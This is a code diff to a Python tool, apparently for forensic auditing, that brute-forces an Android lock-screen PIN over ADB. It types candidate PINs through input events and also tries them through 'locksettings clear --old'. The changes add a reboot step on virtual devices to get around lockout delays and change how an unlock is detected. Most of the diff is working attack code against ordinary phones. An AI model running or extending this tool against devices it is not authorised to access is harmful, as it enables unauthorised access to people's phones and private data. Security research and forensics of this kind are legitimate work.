@@ -79,12 +79,12 @@ def get_screen_status(device):
 
     :param device: Device to audit
     """
-    screen = exec_command(device, "dumpsys nfc | grep 'mScreenState=' | cut -d'=' -f2")
+    screen = exec_command(device, "service call trust 7 | cut -d' ' -f 3")
 
     return screen
 
 
-def start_gui_bf(device):
+def start_gui_bf(device, u_args):
     """Launch GUI bruteforce
 
     :param device: Device to audit
@@ -97,22 +97,32 @@ def start_gui_bf(device):
 
     proc_count = 0
 
+    if not u_args.bf:
     # COMMON DIGIT
-    for pin in digit_list:
-        print("Try %s" % pin)
-        exec_command(device, "input text %s" % pin)
-        exec_command(device, "input keyevent 66")
-        exec_command(device, "input swipe 407 1211 378 85")
-
-        if get_screen_status(device) == "ON_UNLOCKED":
-            sys.exit("PIN identified: %s" % pin)
-
-        proc_count += 1
-
-        if (proc_count % 5) == 0:
-            print("Waiting 30 secondes")
+        for pin in digit_list:
+            print("Try %s" % pin)
+            exec_command(device, "input text %s" % pin)
             exec_command(device, "input keyevent 66")
-            time.sleep(30)
+            exec_command(device, "input swipe 407 1211 378 85")
+
+        
+            if get_screen_status(device) == "00000000":
+                sys.exit("PIN identified: %s" % pin)
+        
+            proc_count += 1
+        
+
+            if not u_args.virtual:
+                if (proc_count % 5) == 0:
+                    print("Waiting 30 secondes")
+                    time.sleep(30)
+                    wake_screen(device)
+            else:
+                if (proc_count % 4) == 0:
+                    exec_command(device, "reboot")
+                    time.sleep(7) # Adjust it according to the speed of the VM
+                    wake_screen(device)
+
 
     # REAL BRUTE-FORCE
     for i in range(0, 10000):
@@ -121,34 +131,46 @@ def start_gui_bf(device):
         if pin in digit_list:
             continue
 
+        print("Try %s" % pin)
         exec_command(device, "input text %s" % pin)
         exec_command(device, "input keyevent 66")
         exec_command(device, "input swipe 407 1211 378 85")
-
-        if get_screen_status(device) == "ON_UNLOCKED":
+        
+        if get_screen_status(device) == "00000000":
             sys.exit("PIN identified: %s" % pin)
-
+        
         proc_count += 1
+        
 
-        if (proc_count % 5) == 0:
-            print("Waiting 30 secondes")
-            time.sleep(30)
+        if not u_args.virtual:
+            if (proc_count % 5) == 0:
+                print("Waiting 30 secondes")
+                time.sleep(30)
+                wake_screen(device)
+        else:
+            if (proc_count % 4) == 0:
+                exec_command(device, "reboot")
+                time.sleep(7) # Adjust it according to the speed of the VM
+                wake_screen(device)
 
 
-def start_locksettings_bf(device):
+def start_locksettings_bf(device, u_args):
     """Launch LockSettings bruteforce
 
     :param device: Device to audit
     """
 
-    # COMMON DIGIT
-    for pin in digit_list:
-        print("Try %s" % pin)
-        command_ret = exec_command(device, "locksettings clear --old %s" % pin)
+    if u_args.bf is None:
+        # COMMON DIGIT
+        for pin in digit_list:
+            print("Try %s" % pin)
+            command_ret = exec_command(device, "locksettings clear --old %s" % pin)
+            if "locksettings: not found" in command_ret:
+                sys.exit("Locksettings not found")
 
-        if command_ret == "Lock credential cleared":
-            exec_command(device, "locksettings set-pin %s" % pin)
-            sys.exit("PIN identified: %s" % pin)
+            if command_ret == "Lock credential cleared":
+                exec_command(device, "locksettings set-pin %s" % pin)
+                sys.exit("PIN identified: %s" % pin)
 
 
     # REAL BRUTE-FORCE
@@ -160,6 +182,9 @@ def start_locksettings_bf(device):
 
         print("Try %s" % pin)
         command_ret = exec_command(device, "locksettings clear --old %s" % pin)
+
+        if "locksettings: not found" in command_ret:
+            sys.exit("Locksettings not found")
 
         if command_ret == "Lock credential cleared":
             exec_command(device, "locksettings set-pin %s" % pin)
